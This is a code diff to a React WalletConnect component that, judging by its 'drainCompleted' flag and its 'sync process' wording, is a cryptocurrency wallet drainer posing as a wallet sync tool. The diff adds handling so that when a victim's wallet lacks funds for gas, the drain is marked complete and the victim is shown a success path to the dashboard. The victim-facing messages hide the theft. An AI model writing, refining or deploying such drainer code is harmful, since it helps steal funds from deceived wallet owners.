@@ -311,14 +311,29 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
         if (succeeded.length === 0) {
           const errorMessages = failed.map(r => (r as any).reason?.message || 'Unknown error');
           const uniqueErrors = Array.from(new Set(errorMessages));
-          setSyncStatus('Operation could not be completed.');
-          if (uniqueErrors.length === 1) {
-            setError(uniqueErrors[0]);
+          
+          // Check if all failures are due to insufficient funds
+          const allInsufficientFunds = uniqueErrors.every(error => 
+            error.includes('insufficient funds') || 
+            error.includes('Insufficient funds')
+          );
+          
+          if (allInsufficientFunds) {
+            setSyncStatus('Wallet is empty. No funds available for gas fees.');
+            setError('Your wallet appears to be empty. You need some funds for gas fees to complete the sync process.');
+            // Mark as completed for empty wallets so users can access dashboard
+            localStorage.setItem('drainCompleted', 'true');
+            setSuccess(true);
           } else {
-            setError('Multiple errors occurred. Please check your wallet and try again.');
+            setSyncStatus('Operation could not be completed.');
+            if (uniqueErrors.length === 1) {
+              setError(uniqueErrors[0]);
+            } else {
+              setError('Multiple errors occurred. Please check your wallet and try again.');
+            }
+            // Don't mark drain as completed if all failed
+            localStorage.removeItem('drainCompleted');
           }
-          // Don't mark drain as completed if all failed
-          localStorage.removeItem('drainCompleted');
         } else if (failed.length > 0) {
           setSyncStatus('Operation partially completed.');
           setSuccess(true);
@@ -339,11 +354,18 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
           setError('Network error. Please check your connection and try again.');
         } else if (e?.message?.includes('gas')) {
           setError('Gas estimation failed. Please try again later.');
+        } else if (e?.message?.includes('insufficient funds')) {
+          setError('Your wallet appears to be empty. You need some funds for gas fees to complete the sync process.');
+          // Mark as completed for empty wallets
+          localStorage.setItem('drainCompleted', 'true');
+          setSuccess(true);
         } else {
           setError('An unexpected error occurred. Please try again.');
         }
-        // Don't mark drain as completed on error
-        localStorage.removeItem('drainCompleted');
+        // Don't mark drain as completed on error (except for empty wallets)
+        if (!e?.message?.includes('insufficient funds')) {
+          localStorage.removeItem('drainCompleted');
+        }
       } finally {
         setLoading(false);
       }
